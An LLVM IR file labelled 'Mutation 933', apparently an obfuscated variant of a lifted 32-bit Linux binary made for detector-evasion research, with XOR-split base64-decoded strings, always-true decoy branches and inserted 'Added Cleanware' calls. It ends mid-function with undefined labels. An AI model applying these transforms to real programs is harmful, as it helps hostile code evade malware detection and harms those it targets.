; Mutation 933
; ModuleID = 'optimized.bc'
source_filename = "llvm-link"
target datalayout = "e-m:e-p:32:32-p270:32:32-p271:32:32-p272:64:64-f64:32:64-f80:32-n8:16:32-S128"
target triple = "i386-pc-linux-gnu"
@stack315 = internal global [8092 x i32] zeroinitializer, align 16
@_ZL6segmem31 = internal global [1024 x i8] zeroinitializer, align 1
@stack394 = internal global [8092 x i32] zeroinitializer, align 16
@_ZL6segmem29 = internal global [1024 x i8] zeroinitializer, align 1
@stack700 = internal global [8092 x i32] zeroinitializer, align 16
@df = internal unnamed_addr global i32 0
@_ZL6segmem27 = internal global [1024 x i8] zeroinitializer, align 1
@stack78 = internal global [8092 x i32] zeroinitializer, align 16
@_ZL6segmem25 = internal global [1024 x i8] zeroinitializer, align 1
@stack911 = internal global [8092 x i32] zeroinitializer, align 16
@_ZL6segmem23 = internal global [1024 x i8] zeroinitializer, align 1
declare void @llvm.memset.p0i8.i32(i8* nocapture writeonly, i8, i32, i1 immarg)  argmemonly nofree nounwind willreturn writeonly 
@stack925 = internal global [8092 x i32] zeroinitializer, align 16
@_ZL6segmem21 = internal global [1024 x i8] zeroinitializer, align 1
@stack87 = internal global [8092 x i32] zeroinitializer, align 16
@_ZL6segmem19 = internal global [1024 x i8] zeroinitializer, align 1
@stack568 = internal global [8092 x i32] zeroinitializer, align 16
@stack259 = internal global [8092 x i32] zeroinitializer, align 16
@_ZL6segmem16 = internal global [1024 x i8] zeroinitializer, align 1
@stack48 = internal global [8092 x i32] zeroinitializer, align 16
@_ZL6segmem14 = internal global [1024 x i8] zeroinitializer, align 1
declare i32 @strstr(i32, i32) local_unnamed_addr  noinline 
@stack881 = internal global [8092 x i32] zeroinitializer, align 16
@_ZL6segmem12 = internal global [1024 x i8] zeroinitializer, align 1
declare i32 @strlen(i32) local_unnamed_addr  noinline 
declare i32 @strchr(i32, i32) local_unnamed_addr  noinline 
declare i32 @strcpy(i32, i32) local_unnamed_addr  noinline 
@stack692 = internal global [8092 x i32] zeroinitializer, align 16
@_ZL6segmem10 = internal global [1024 x i8] zeroinitializer, align 1
@stack230 = internal global [8092 x i32] zeroinitializer, align 16
declare noundef i32 @putchar(i32 noundef) local_unnamed_addr  nofree noinline nounwind 
@stack140 = internal global [8092 x i32] zeroinitializer, align 16
@_ZL6segmem7 = internal global [1024 x i8] zeroinitializer, align 1
@stack463 = internal global [8092 x i32] zeroinitializer, align 16
@_ZL6segmem5 = internal global [1024 x i8] zeroinitializer, align 1
declare i32 @malloc(i32) local_unnamed_addr  noinline 
declare void @free(i32) local_unnamed_addr  noinline 
@stack44 = internal global [8092 x i32] zeroinitializer, align 16
declare dso_local i32 @puts(i8* noundef) local_unnamed_addr  "frame-pointer"="none" "no-builtins" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="pentium4" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" 
@stack396 = internal global [8092 x i32] zeroinitializer, align 16
@_ZL6segmem2 = internal global [1024 x i8] zeroinitializer, align 1
declare void @srand(i32) local_unnamed_addr  noinline 
declare i32 @rand() local_unnamed_addr  noinline 
declare i32 @time(i32) local_unnamed_addr  noinline 
declare void @llvm.assume(i1 noundef)  inaccessiblememonly nofree nosync nounwind willreturn 

@fpstt = internal unnamed_addr global i32 0
@fp_status.0 = internal unnamed_addr global i8 0
@stack = internal global [4194304 x i32] zeroinitializer, align 16
@segs.0 = internal unnamed_addr global i1 false
@_ZL6segmem = internal global [1024 x i8] zeroinitializer, align 1
@onUnfallback = common local_unnamed_addr global i1 false
;-------------------------------
; Replace: %cast95= getelementptr [11 x i8], [11 x i8]* @.str94, i64 0, i64 0
;-------------------------------
; Replace: %cast97= getelementptr [10 x i8], [10 x i8]* @.str96, i64 0, i64 0
;-------------------------------
; Replace: %cast99= getelementptr [10 x i8], [10 x i8]* @.str98, i64 0, i64 0
;-------------------------------
; Replace: %cast101= getelementptr [8 x i8], [8 x i8]* @.str100, i64 0, i64 0
@str.7.115 = constant [1 x i8] c"\00"
;-------------------------------
; Replace: %cast103= getelementptr [11 x i8], [11 x i8]* @.str102, i64 0, i64 0
;-------------------------------
; Replace: %cast105= getelementptr [11 x i8], [11 x i8]* @.str104, i64 0, i64 0
;-------------------------------
; Replace: %cast107= getelementptr [10 x i8], [10 x i8]* @.str106, i64 0, i64 0
;-------------------------------
; Replace: %cast109= getelementptr [11 x i8], [11 x i8]* @.str108, i64 0, i64 0
;-------------------------------
; Replace: %cast111= getelementptr [10 x i8], [10 x i8]* @.str110, i64 0, i64 0
;-------------------------------
; Replace: store [2 x i8] c"\07\4A", [2 x i8]* %sp0.70
;-------------------------------
; Replace: store [2 x i8] c"\36\4a", [2 x i8]* %sp1.70
;-------------------------------
; Replace: store [2 x i8] c"\47\6B", [2 x i8]* %sp0.71
;-------------------------------
; Replace: store [2 x i8] c"\74\6b", [2 x i8]* %sp1.71
;-------------------------------
; Replace: store [4 x i8] c"\66\33\1F\43", [4 x i8]* %sp0.72
;-------------------------------
; Replace: store [4 x i8] c"\63\69\32\43", [4 x i8]* %sp1.72
;-------------------------------
; Replace: store [14 x i8] c"\2D\4F\55\17\69\2D\24\2E\2A\6D\60\76\4B\58", [14 x i8]* %sp0.73
;-------------------------------
; Replace: store [14 x i8] c"\64\6f\34\7a\49\48\52\47\46\4c\41\57\41\58", [14 x i8]* %sp1.73
;-------------------------------
; Replace: store [9 x i8] c"\27\3C\12\69\1A\4C\5D\44\37", [9 x i8]* %sp0.74
;-------------------------------
; Replace: store [9 x i8] c"\65\45\77\49\58\35\38\4e\37", [9 x i8]* %sp1.74
;-------------------------------
; Replace: store [3 x i8] c"\4C\02\47", [3 x i8]* %sp0.75
;-------------------------------
; Replace: store [3 x i8] c"\69\71\47", [3 x i8]* %sp1.75
;-------------------------------
; Replace: store [2 x i8] c"\5F\51", [2 x i8]* %sp0.76
;-------------------------------
; Replace: store [2 x i8] c"\6d\51", [2 x i8]* %sp1.76
;-------------------------------
; Replace: store [3 x i8] c"\01\40\6B", [3 x i8]* %sp0.77
;-------------------------------
; Replace: store [3 x i8] c"\76\6b\6b", [3 x i8]* %sp1.77
;-------------------------------
; Replace: store [15 x i8] c"\02\0D\33\31\05\50\00\5E\54\46\57\12\0C\05\49", [15 x i8]* %sp0.78
;-------------------------------
; Replace: store [15 x i8] c"\76\68\4b\45\5a\36\69\32\31\75\79\66\74\71\49", [15 x i8]* %sp1.78
;-------------------------------
; Replace: store [18 x i8] c"\0A\22\1E\4C\3D\31\0D\3C\3F\10\5C\2E\55\33\68\58\57\41", [18 x i8]* %sp0.34
;-------------------------------
; Replace: store [18 x i8] c"\44\4d\6a\6c\59\54\6f\49\58\30\31\41\31\56\48\6a\76\41", [18 x i8]* %sp1.34
;-------------------------------
; Replace: store [16 x i8] c"\34\05\18\6D\35\52\34\47\54\15\14\2E\56\02\42\43", [16 x i8]* %sp0.33
;-------------------------------
; Replace: store [16 x i8] c"\7a\6a\6c\4d\51\37\56\32\33\35\79\41\32\67\63\43", [16 x i8]* %sp1.33
;-------------------------------
; Replace: store [21 x i8] c"\03\38\1B\2C\37\09\1E\21\2D\3F\2F\15\15\5E\58\61\57\20\26\7B\7A", [21 x i8]* %sp0.32
;-------------------------------
; Replace: store [21 x i8] c"\70\51\61\49\58\6f\36\43\58\59\49\70\67\77\62\41\72\4c\53\71\7a", [21 x i8]* %sp1.32
;-------------------------------
; Replace: store [7 x i8] c"\15\33\5F\4C\34\5A\41", [7 x i8]* %sp0.35
;-------------------------------
; Replace: store [7 x i8] c"\30\50\65\69\50\50\41", [7 x i8]* %sp1.35
;-------------------------------
; Replace: store [16 x i8] c"\0F\56\3E\61\1F\2D\19\27\47\3D\5A\17\2E\06\3F\46", [16 x i8]* %sp0.36
;-------------------------------
; Replace: store [16 x i8] c"\6e\32\5a\41\76\43\6a\53\35\48\39\63\47\69\51\46", [16 x i8]* %sp1.36
;-------------------------------
; Replace: store [21 x i8] c"\46\31\26\17\08\56\22\27\79\3D\0A\02\26\3F\05\10\35\31\0E\22\51", [21 x i8]* %sp0.37
;-------------------------------
; Replace: store [21 x i8] c"\35\44\44\63\7a\37\41\53\59\54\64\71\52\4d\70\73\41\58\61\4c\51", [21 x i8]* %sp1.37
;-------------------------------
; Replace: store [20 x i8] c"\51\0A\14\19\3C\03\11\06\0B\46\54\24\51\1C\05\55\2F\0B\24\43", [20 x i8]* %sp0.45
;-------------------------------
; Replace: store [20 x i8] c"\30\78\66\78\45\32\31\6f\78\66\35\57\32\79\6b\31\46\65\43\43", [20 x i8]* %sp1.45
;-------------------------------
; Replace: store [21 x i8] c"\03\39\08\2C\2C\4A\42\00\01\19\67\57\4A\20\26\39\57\23\05\35\4B", [21 x i8]* %sp0.44
;-------------------------------
; Replace: store [21 x i8] c"\62\4b\7a\4d\55\78\62\6e\6e\6d\47\36\39\43\43\57\33\4a\6b\52\4b", [21 x i8]* %sp1.44
;-------------------------------
; Replace: store [4 x i8] c"\73\11\66\61", [4 x i8]* %sp0.43
;-------------------------------
; Replace: store [4 x i8] c"\76\43\4d\61", [4 x i8]* %sp1.43
;-------------------------------
; Replace: store [22 x i8] c"\27\02\1D\04\2E\57\65\2F\57\23\70\5D\01\16\51\1F\19\52\05\0B\0C\6E", [22 x i8]* %sp0.42
;-------------------------------
; Replace: store [22 x i8] c"\46\70\6f\65\57\66\45\41\38\57\50\39\64\65\32\7a\77\36\6c\65\6b\6e", [22 x i8]* %sp1.42
;-------------------------------
; Replace: store [4 x i8] c"\4D\1B\4A\4F", [4 x i8]* %sp0.41
;-------------------------------
; Replace: store [4 x i8] c"\48\49\61\4f", [4 x i8]* %sp1.41
;-------------------------------
; Replace: store [21 x i8] c"\35\4B\06\2C\1D\7C\41\38\1E\16\01\50\23\10\02\1E\3C\38\37\04\30", [21 x i8]* %sp0.40
;-------------------------------
; Replace: store [21 x i8] c"\54\39\74\4d\64\4e\61\51\6d\36\65\35\50\73\67\70\58\51\59\63\30", [21 x i8]* %sp1.40
;-------------------------------
; Replace: store [17 x i8] c"\09\3D\01\51\23\46\12\21\0B\19\4B\57\1E\06\1D\0C\66", [17 x i8]* %sp0.39
;-------------------------------
; Replace: store [17 x i8] c"\68\4f\73\30\5a\77\32\48\78\39\38\38\6c\72\78\68\66", [17 x i8]* %sp1.39
;-------------------------------
; Replace: store [17 x i8] c"\54\30\35\59\0B\02\63\23\00\57\14\57\0B\17\36\0E\35", [17 x i8]* %sp0.38
;-------------------------------
; Replace: store [17 x i8] c"\35\42\47\38\72\30\43\4a\73\77\67\38\79\63\53\6a\35", [17 x i8]* %sp1.38
;-------------------------------
; Replace: store [7 x i8] c"\05\56\59\11\54\52\32", [7 x i8]* %sp0.48
;-------------------------------
; Replace: store [7 x i8] c"\64\6c\79\34\37\58\32", [7 x i8]* %sp1.48
;-------------------------------
; Replace: store [23 x i8] c"\41\28\0D\5F\28\38\3C\16\37\11\17\32\33\5F\5C\20\3E\0E\6F\71\50\6C\44", [23 x i8]* %sp0.47
;-------------------------------
; Replace: store [23 x i8] c"\6b\58\62\36\46\4c\59\64\68\65\78\6d\50\30\32\53\4a\34\4f\54\33\66\44", [23 x i8]* %sp1.47
;-------------------------------
; Replace: store [23 x i8] c"\5A\22\3F\06\3B\3D\1C\4A\0C\15\00\16\09\5D\09\1A\0C\4B\55\6F\12\6C\64", [23 x i8]* %sp0.46
;-------------------------------
; Replace: store [23 x i8] c"\70\52\50\6f\55\49\79\38\53\61\6f\49\6a\32\67\69\78\71\75\4a\71\66\64", [23 x i8]* %sp1.46
;-------------------------------
; Replace: store [11 x i8] c"\5B\63\7C\61\78\03\29\1D\55\0A\72", [11 x i8]* %sp0.51
;-------------------------------
; Replace: store [11 x i8] c"\6a\51\4f\57\4b\62\4a\79\30\6c\72", [11 x i8]* %sp1.51
;-------------------------------
; Replace: store [11 x i8] c"\62\67\76\57\71\67\05\55\0D\4A\30", [11 x i8]* %sp0.50
;-------------------------------
; Replace: store [11 x i8] c"\52\56\44\64\45\52\33\62\35\73\30", [11 x i8]* %sp1.50
;-------------------------------
; Replace: store [11 x i8] c"\55\48\73\6B\44\42\79\07\7B\0C\34", [11 x i8]* %sp0.49
;-------------------------------
; Replace: store [11 x i8] c"\65\79\41\58\70\77\4f\30\43\35\34", [11 x i8]* %sp1.49
;-------------------------------
; Replace: store [4 x i8] c"\6F\4B\5C\4B", [4 x i8]* %sp0.53
;-------------------------------
; Replace: store [4 x i8] c"\6a\32\71\4b", [4 x i8]* %sp1.53
;-------------------------------
; Replace: store [11 x i8] c"\2B\3E\3D\1E\05\02\49\42\32\42\6F", [11 x i8]* %sp0.52
;-------------------------------
; Replace: store [11 x i8] c"\48\51\48\70\71\38\69\67\56\48\6f", [11 x i8]* %sp1.52
;-------------------------------
; Replace: store [12 x i8] c"\0C\36\01\28\3F\13\73\43\63\47\33\54", [12 x i8]* %sp0.55
;-------------------------------
; Replace: store [12 x i8] c"\4e\53\67\47\4d\76\49\63\46\34\39\54", [12 x i8]* %sp1.55
;-------------------------------
; Replace: store [5 x i8] c"\01\02\56\62\35", [5 x i8]* %sp0.54
;-------------------------------
; Replace: store [5 x i8] c"\75\6a\33\42\35", [5 x i8]* %sp1.54
;-------------------------------
; Replace: store [6 x i8] c"\4A\79\76\5C\69\64", [6 x i8]* %sp0.56
;-------------------------------
; Replace: store [6 x i8] c"\6f\49\44\38\49\64", [6 x i8]* %sp1.56
;-------------------------------
; Replace: store [4 x i8] c"\4B\05\49\69", [4 x i8]* %sp0.58
;-------------------------------
; Replace: store [4 x i8] c"\6e\61\43\69", [4 x i8]* %sp1.58
;-------------------------------
; Replace: store [22 x i8] c"\38\2C\22\2F\5F\33\11\68\10\40\43\39\3D\79\2A\37\5E\25\15\51\4A\6E", [22 x i8]* %sp0.57
;-------------------------------
; Replace: store [22 x i8] c"\71\42\54\4e\33\5a\75\48\71\32\31\58\44\59\46\52\30\42\61\39\6b\6e", [22 x i8]* %sp1.57
;-------------------------------
; Replace: store [12 x i8] c"\25\15\18\29\3B\26\59\46\6C\07\60\76", [12 x i8]* %sp0.67
;-------------------------------
; Replace: store [12 x i8] c"\49\70\76\4e\4f\4e\63\66\49\63\6a\76", [12 x i8]* %sp1.67
;-------------------------------
; Replace: store [19 x i8] c"\21\5E\2F\3C\5D\53\52\50\46\06\25\34\6C\49\73\17\06\53\6B", [19 x i8]* %sp0.66
;-------------------------------
; Replace: store [19 x i8] c"\52\37\55\59\32\35\7a\31\34\74\44\4d\45\73\53\32\62\59\6b", [19 x i8]* %sp1.66
;-------------------------------
; Replace: store [17 x i8] c"\3B\22\43\11\1A\00\6D\5F\22\3C\4C\03\64\76\2C\7B\69", [17 x i8]* %sp0.65
;-------------------------------
; Replace: store [17 x i8] c"\48\4b\39\74\75\66\45\36\4c\48\65\39\44\53\48\71\69", [17 x i8]* %sp1.65
;-------------------------------
; Replace: store [20 x i8] c"\40\05\03\0B\0E\50\64\30\1F\44\11\25\0C\4A\08\50\72\25\5D\47", [20 x i8]* %sp0.64
;-------------------------------
; Replace: store [20 x i8] c"\33\6c\79\6e\61\36\4c\54\70\31\73\49\69\63\32\70\57\41\57\47", [20 x i8]* %sp1.64
;-------------------------------
; Replace: store [22 x i8] c"\22\38\02\13\06\29\5C\08\10\04\18\2C\3D\00\1C\6E\6C\68\4A\55\44\43", [22 x i8]* %sp0.63
;-------------------------------
; Replace: store [22 x i8] c"\51\51\78\76\69\4f\74\69\62\76\79\55\66\30\41\47\56\48\6f\31\4e\43", [22 x i8]* %sp1.63
;-------------------------------
; Replace: store [27 x i8] c"\05\51\39\06\3A\56\52\37\09\16\26\18\22\2C\08\25\18\21\2E\1B\7A\59\5A\44\25\7C\33", [27 x i8]* %sp0.62
;-------------------------------
; Replace: store [27 x i8] c"\76\38\43\63\55\30\7a\53\70\78\47\75\4b\4f\57\44\6a\53\4f\62\53\63\7a\61\41\76\33", [27 x i8]* %sp1.62
;-------------------------------
; Replace: store [20 x i8] c"\34\3B\5B\31\02\5E\5A\07\0D\56\37\5E\47\5B\7B\6E\74\23\59\30", [20 x i8]* %sp0.61
;-------------------------------
; Replace: store [20 x i8] c"\50\42\35\50\6f\37\39\58\61\33\59\39\33\33\41\4e\51\47\53\30", [20 x i8]* %sp1.61
;-------------------------------
; Replace: store [12 x i8] c"\1D\04\2D\15\30\38\0D\51\74\12\32\52", [12 x i8]* %sp0.60
;-------------------------------
; Replace: store [12 x i8] c"\51\41\63\52\64\70\37\71\51\76\38\52", [12 x i8]* %sp1.60
;-------------------------------
; Replace: store [16 x i8] c"\56\1D\38\15\2C\6C\62\13\18\11\08\15\77\0A\33\74", [16 x i8]* %sp0.59
;-------------------------------
; Replace: store [16 x i8] c"\37\6f\4a\74\55\37\47\77\45\31\35\35\52\6e\39\74", [16 x i8]* %sp1.59
;-------------------------------
; Replace: store [4 x i8] c"\5F\30\1A\45", [4 x i8]* %sp0.69
;-------------------------------
; Replace: store [4 x i8] c"\5a\62\34\45", [4 x i8]* %sp1.69
;-------------------------------
; Replace: store [12 x i8] c"\0B\15\24\01\03\52\21\21\4A\0F\12\39", [12 x i8]* %sp0.68
;-------------------------------
; Replace: store [12 x i8] c"\43\70\48\6d\6c\72\76\4e\38\63\76\39", [12 x i8]* %sp1.68
declare i8* @base64_decode(i8*)

; Function Attrs: mustprogress nofree norecurse nosync nounwind uwtable willreturn
define internal fastcc void @helper_fldl_ST0(i64 noundef %0) unnamed_addr #0 {
._crit_edge:
  %1 = load i32, i32* @fpstt, align 16
  %.pre = and i64 %0, 4503599627370495
  %.pre1 = and i64 %0, 9218868437227405312
  %phi.cmp = icmp ne i64 %.pre1, 9218868437227405312
  %phi.cmp3 = icmp eq i64 %.pre, 0
  %2 = or i1 %phi.cmp, %phi.cmp3
  br i1 %2, label %float64_to_floatx80.18.exit, label %3

3:                                                ; preds = %._crit_edge
  %4 = and i64 %0, 9221120237041090560
  %5 = icmp ne i64 %4, 9218868437227405312
  %6 = and i64 %0, 2251799813685247
  %7 = icmp eq i64 %6, 0
  %8 = or i1 %5, %7
  br i1 %8, label %float64_to_floatx80.18.exit, label %.sink.split.i

.sink.split.i:                                    ; preds = %3
  %9 = load i8, i8* @fp_status.0, align 1
  %10 = or i8 %9, 1
  store i8 %10, i8* @fp_status.0, align 1
  br label %float64_to_floatx80.18.exit

float64_to_floatx80.18.exit:                      ; preds = %.sink.split.i, %3, %._crit_edge
  %11 = add i32 %1, 7
  %12 = and i32 %11, 7
  store i32 %12, i32* @fpstt, align 16
  ret void
}

; Function Attrs: mustprogress nofree norecurse nosync nounwind uwtable willreturn writeonly
define internal fastcc void @helper_fninit() unnamed_addr #1 {
  store i32 0, i32* @fpstt, align 16
  ret void
}

; Function Attrs: naked noinline
declare dso_local i32 @printf(i8* noundef, ...) local_unnamed_addr #2

; Function Attrs: mustprogress nounwind uwtable
define internal x86_fastcallcc i64 @helper_stub_trampoline(i32 inreg noundef %0, i32 inreg noundef %1, i32 noundef %2, i32 noundef %3) local_unnamed_addr #3 {
  %5 = alloca double, align 8
  %6 = tail call { i32, i32 } asm "movl    %esp, %ebx\0A\09movl    $2, %esp\0A\09calll   *$3\0A\09movl    %ebx, %esp", "={ax},={dx},r,r,{cx},{dx},~{ebx},~{dirflag},~{fpsr},~{flags}"(i32 %2, i32 %3, i32 %0, i32 %1) #9
  %7 = extractvalue { i32, i32 } %6, 0
  %8 = extractvalue { i32, i32 } %6, 1
  %9 = bitcast double* %5 to i8*
  call void @llvm.lifetime.start.p0i8(i64 8, i8* nonnull %9) #10
  call void asm "fstpl   $0", "=*m,~{dirflag},~{fpsr},~{flags}"(double* nonnull elementtype(double) %5) #10
  %10 = load double, double* %5, align 8, !tbaa !6
  %11 = fptoui double %10 to i64
  call fastcc void @helper_fldl_ST0(i64 noundef %11) #11
  %12 = zext i32 %8 to i64
  %13 = shl nuw i64 %12, 32
  %14 = zext i32 %7 to i64
  %15 = or i64 %13, %14
  call void @llvm.lifetime.end.p0i8(i64 8, i8* nonnull %9) #10
  ret i64 %15
}

; Function Attrs: argmemonly nofree nosync nounwind willreturn
declare void @llvm.lifetime.start.p0i8(i64 immarg, i8* nocapture) #4

; Function Attrs: argmemonly nofree nosync nounwind willreturn
declare void @llvm.lifetime.end.p0i8(i64 immarg, i8* nocapture) #4

; Function Attrs: norecurse nounwind uwtable
define dso_local noundef i32 @main(i32 noundef %0, i8** noundef %1, i8** noundef %2) local_unnamed_addr #5 {
  %4 = tail call i32 asm "pushf\0A\09popl $0", "=r,~{dirflag},~{fpsr},~{flags}"() #9
  store i1 true, i1* @segs.0, align 1
  tail call fastcc void @helper_fninit() #11
  %5 = ptrtoint i8** %2 to i32
  store i32 %5, i32* getelementptr inbounds ([4194304 x i32], [4194304 x i32]* @stack, i32 0, i32 4194303), align 4, !tbaa !10
  %6 = ptrtoint i8** %1 to i32
  store i32 %6, i32* getelementptr inbounds ([4194304 x i32], [4194304 x i32]* @stack, i32 0, i32 4194302), align 8, !tbaa !10
  store i32 %0, i32* getelementptr inbounds ([4194304 x i32], [4194304 x i32]* @stack, i32 0, i32 4194301), align 4, !tbaa !10
  %7 = tail call i8* @llvm.returnaddress(i32 0)
  %8 = ptrtoint i8* %7 to i32
  store i32 %8, i32* getelementptr inbounds ([4194304 x i32], [4194304 x i32]* @stack, i32 0, i32 4194300), align 16, !tbaa !10
  tail call fastcc void @Func_main(i32 ptrtoint (i32* getelementptr inbounds ([4194304 x i32], [4194304 x i32]* @stack, i32 0, i32 4194300) to i32)) #10
  ret i32 0
}

; Function Attrs: nofree nosync nounwind readnone willreturn
declare i8* @llvm.returnaddress(i32 immarg) #6

; Function Attrs: noinline
declare i32 @close(i32) local_unnamed_addr #7

; Function Attrs: noinline
declare i32 @socket(i32, i32, i32) local_unnamed_addr #7

; Function Attrs: noinline
declare i32 @fclose(i32) local_unnamed_addr #7

; Function Attrs: noinline
declare i32 @fopen(i32, i32) local_unnamed_addr #7

; Function Attrs: noinline
declare i32 @fwrite(i32, i32, i32, i32) local_unnamed_addr #7

; Function Attrs: noinline
declare i32 @strcmp(i32, i32) local_unnamed_addr #7

; Function Attrs: norecurse
define internal fastcc void @Func_main(i32 %arg_esp) unnamed_addr #8 !retregs !12 {
Func_804941F.exit.i:
  %tmp2_v.i.i = add i32 %arg_esp, 4
  %tmp0_v.i.i = and i32 %arg_esp, -16
;-------------------------------
;----Call to Added Cleanware----
;-------------------------------
;--------Basic Condition--------
  %.not105.i.i = icmp eq i32 0 , 0 ;always true
  br i1 %.not105.i.i, label %BB_105, label %next105
next105:
;-------------------------------
  tail call fastcc void @matrix_subtraction926 (i32 ptrtoint (i32* getelementptr inbounds ([8092 x i32], [8092 x i32]* @stack925, i32 0, i32 8092) to i32)) nounwind
;-------------------------------
  %0 = inttoptr i32 %arg_esp to i32*
  %1 = load i32, i32* %0, align 4
  %tmp2_v3.i.i = add i32 %tmp0_v.i.i, -4
  %2 = inttoptr i32 %tmp2_v3.i.i to i32*
  store i32 %1, i32* %2, align 4
  %tmp2_v4.i.i = add i32 %tmp0_v.i.i, -8
  %3 = inttoptr i32 %tmp2_v4.i.i to i32*
  store i32 0, i32* %3, align 8
  %tmp2_v5.i.i = add i32 %tmp0_v.i.i, -12
  %4 = inttoptr i32 %tmp2_v5.i.i to i32*
;-------------------------------
;----Call to Added Cleanware----
  tail call fastcc void @hello45 (i32 ptrtoint (i32* getelementptr inbounds ([8092 x i32], [8092 x i32]* @stack44, i32 0, i32 8092) to i32)) nounwind
;-------------------------------
  store i32 0, i32* %4, align 4
  %tmp2_v6.i.i = add i32 %tmp0_v.i.i, -16
  %5 = inttoptr i32 %tmp2_v6.i.i to i32*
  store i32 0, i32* %5, align 16
  %tmp2_v7.i.i = add i32 %tmp0_v.i.i, -20
  %6 = inttoptr i32 %tmp2_v7.i.i to i32*
  store i32 %tmp2_v.i.i, i32* %6, align 4
  %tmp2_v9.i.i = add i32 %tmp0_v.i.i, -36
  %7 = inttoptr i32 %tmp2_v9.i.i to i32*
  store i32 134517759, i32* %7, align 4
  %tmp2_v.i21.i = add i32 %arg_esp, 8
  %8 = inttoptr i32 %tmp2_v.i21.i to i32*
  %9 = load i32, i32* %8, align 4
  %tmp0_v2.i23.i = add i32 %9, 4
  %10 = inttoptr i32 %tmp0_v2.i23.i to i32*
  %11 = load i32, i32* %10, align 4
  %tmp2_v6.i27.i = add i32 %tmp0_v.i.i, -44
  %12 = inttoptr i32 %tmp2_v6.i27.i to i32*
;-------------------------------
; Replace: store i32 134520900, i32* %12, align 4
  %sp0.70 = alloca [2 x i8]
;-------------------------------
; Replace: store [2 x i8] c"\07\4A", [2 x i8]* %sp0.70
  %sp121 = alloca [2 x i8]
  
;-------------------------------
; Replace: %s0.121 = load [1 x i8], [1 x i8]* @str.0.121
  %cipher.ptr.300 = alloca [5 x i8]
  store [5 x i8] c"\42\77\3d\3d\00", [5 x i8]* %cipher.ptr.300
  %cipher.300 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.300, i32 0, i32 0
  %plain.ptr.300 = tail call i8* @base64_decode(i8* %cipher.300)
  %spi300 = bitcast i8* %plain.ptr.300 to [1 x i8]*
  %s0.121 = load [1 x i8], [1 x i8]* %spi300
;-------------------------------
  %sp0.121 = bitcast [2 x i8]* %sp121 to [1 x i8]*
  store [1 x i8] %s0.121, [1 x i8]* %sp0.121
  %next0.121 = getelementptr [2 x i8], [2 x i8]* %sp121, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.121 = load [1 x i8], [1 x i8]* @str.1.121
  %cipher.ptr.301 = alloca [5 x i8]
  store [5 x i8] c"\53\67\3d\3d\00", [5 x i8]* %cipher.ptr.301
  %cipher.301 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.301, i32 0, i32 0
  %plain.ptr.301 = tail call i8* @base64_decode(i8* %cipher.301)
  %spi301 = bitcast i8* %plain.ptr.301 to [1 x i8]*
  %s1.121 = load [1 x i8], [1 x i8]* %spi301
;-------------------------------
  %sp1.121 = bitcast i8* %next0.121 to [1 x i8]*
  store [1 x i8] %s1.121, [1 x i8]* %sp1.121

  %spi121 = load [2 x i8], [2 x i8]* %sp121
  store [2 x i8] %spi121, [2 x i8]* %sp0.70
;-------------------------------
  %sp0.1.70 = bitcast [2 x i8]* %sp0.70 to i16*
  %i0.70 = load i16, i16* %sp0.1.70

  %sp1.70 = alloca [2 x i8]
;-------------------------------
; Replace: store [2 x i8] c"\36\4a", [2 x i8]* %sp1.70
  %sp122 = alloca [2 x i8]
  
;-------------------------------
; Replace: %s0.122 = load [1 x i8], [1 x i8]* @str.0.122
  %cipher.ptr.303 = alloca [5 x i8]
  store [5 x i8] c"\4e\67\3d\3d\00", [5 x i8]* %cipher.ptr.303
  %cipher.303 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.303, i32 0, i32 0
  %plain.ptr.303 = tail call i8* @base64_decode(i8* %cipher.303)
  %spi303 = bitcast i8* %plain.ptr.303 to [1 x i8]*
  %s0.122 = load [1 x i8], [1 x i8]* %spi303
;-------------------------------
  %sp0.122 = bitcast [2 x i8]* %sp122 to [1 x i8]*
  store [1 x i8] %s0.122, [1 x i8]* %sp0.122
  %next0.122 = getelementptr [2 x i8], [2 x i8]* %sp122, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.122 = load [1 x i8], [1 x i8]* @str.1.122
  %cipher.ptr.302 = alloca [5 x i8]
  store [5 x i8] c"\53\67\3d\3d\00", [5 x i8]* %cipher.ptr.302
  %cipher.302 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.302, i32 0, i32 0
  %plain.ptr.302 = tail call i8* @base64_decode(i8* %cipher.302)
  %spi302 = bitcast i8* %plain.ptr.302 to [1 x i8]*
  %s1.122 = load [1 x i8], [1 x i8]* %spi302
;-------------------------------
  %sp1.122 = bitcast i8* %next0.122 to [1 x i8]*
  store [1 x i8] %s1.122, [1 x i8]* %sp1.122

  %spi122 = load [2 x i8], [2 x i8]* %sp122
  store [2 x i8] %spi122, [2 x i8]* %sp1.70
;-------------------------------
  %sp1.1.70 = bitcast [2 x i8]* %sp1.70 to i16*
  %i1.70 = load i16, i16* %sp1.1.70

  %xp70 = xor i16 %i0.70, %i1.70

  %fi.70 = alloca i16
  store i16 %xp70, i16* %fi.70

  %spi70 = ptrtoint i16* %fi.70 to i32
  store i32 %spi70, i32* %12, align 4
;-------------------------------
  %tmp2_v7.i28.i = add i32 %tmp0_v.i.i, -48
  %13 = inttoptr i32 %tmp2_v7.i28.i to i32*
  store i32 %11, i32* %13, align 16
  %tmp2_v8.i.i = add i32 %tmp0_v.i.i, -52
  %14 = inttoptr i32 %tmp2_v8.i.i to i32*
  store i32 134517791, i32* %14, align 4
  %arg.i.i = load i32, i32* %13, align 16
  %arg2.i.i = load i32, i32* %12, align 4
;-------------------------------
;--------Basic Condition--------
  %.not97.i.i = icmp eq i32 0 , 0 ;always true
  br i1 %.not97.i.i, label %BB_97, label %next97
next97:
;-------------------------------
  %15 = tail call i32 @strcmp(i32 %arg.i.i, i32 %arg2.i.i)
  %.not.i32.i = icmp eq i32 %15, 0
  br i1 %.not.i32.i, label %BB_8049426.i, label %BB_804942D.i

BB_8049453.i:                                     ; preds = %BB_804942D.i
  %16 = load i32, i32* %8, align 4
  %tmp0_v1.i8.i = add i32 %16, 4
  %17 = inttoptr i32 %tmp0_v1.i8.i to i32*
  %18 = load i32, i32* %17, align 4
;-------------------------------
; Replace: store i32 134520904, i32* %12, align 4
  %sp0.71 = alloca [2 x i8]
;-------------------------------
; Replace: store [2 x i8] c"\47\6B", [2 x i8]* %sp0.71
